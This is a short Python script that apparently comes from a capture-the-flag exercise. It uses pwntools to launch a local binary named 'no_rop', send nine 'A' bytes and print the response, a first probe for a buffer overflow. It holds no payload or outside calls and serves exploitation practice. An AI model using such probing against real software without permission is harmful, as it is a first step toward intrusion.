from multiprocessing import process
from pwn import *

garbage = b'A' * 9
p=process('./no_rop')
p.sendline(garbage)
msgout=p.recvall()
print(msgout)